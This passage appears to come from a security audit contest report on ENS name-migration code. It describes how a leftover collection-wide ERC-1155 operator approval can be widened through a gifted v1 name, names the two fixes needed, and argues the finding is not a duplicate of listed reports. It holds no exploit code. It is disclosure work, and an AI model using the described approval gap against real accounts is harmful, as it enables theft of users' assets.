**I am not claiming the MigrationHelper approval is itself exploitable.** The comment at `migrationApprovals.ts:73-77` asserts the helper resolves every caller back to its certified owner. MigrationHelper is an out-of-scope ENS contract, I could not read its source here, and building a claim on negating that assertion is exactly how an earlier report in this competition died. The permanence and the documentation contradiction are what is claimed.

**The missing `finally` is a separate fix from the missing revoke ids.** Widening `requiresMigrationApprovalCleanup` does not make the revoke run on a failed migration, and adding a `finally` does not revoke the two approvals that are excluded by id. Both changes are needed, which is why this is filed as one finding with two required fixes rather than folded into another report.

**The precondition is ordinary.** An unreclaimed controller is the normal state of any v1 name bought on a marketplace. Receiving an ERC-721 requires no consent and no action from the victim.

## Not a duplicate

**R2-03** describes the session key being an unscoped full owner of the HCA for seven days, and states that reports about that key being broadly scoped or exfiltratable are duplicates of it. This is not about the key. It is about an attacker being able to widen, without the victim's knowledge, the set of assets that account has ERC-1155 operator authority over. R2-03's fix, scoping the session key, does not remove a collection-wide `setApprovalForAll` on the registry.

**R2-06** is that session revocation is local-only with no on-chain revoke. Also not this. The approval here is a registry-level operator grant with its own revoke call, which the app does implement, but only for one of three ids and only on the success path.

**SEC-TXM-002** is a cached smart-account address not being cross-checked against the live SDK address. That check is in fact shipped in this tree at `packages/transaction-manager/src/helpers/getSmartAccountAddress.ts:20-27`, which throws `SignerAddressMismatchError`. This finding needs the correct HCA address, so that fix makes no difference to it.

**EXP-4337-002** and **EXP-4337-003** are chainId and `request.from` validation in the transaction transports. Different package, different fix, neither touches approval scope.

**WEB-1249** is subname creation replacing a child registry, and **QA-01** is role combinations causing errors after transfers. Neither involves an approval scope or a cleanup path. QA-01's own text carves out demonstrated security consequences as new findings.

**R3-01 through R3-08** are transaction-manager availability and data-integrity defects. Different package.

Not the companion role-grant finding filed alongside this one. That one is `grantRoles(resource, ROLE_SET_RESOLVER, thirdParty)` in `buildRoleGrantCalls.ts`. This one is the approval set in `migrationApprovals.ts` and the cleanup in `migrationService.ts`. They share the gifted-name primitive but need entirely separate fixes, and fixing either leaves the other live.
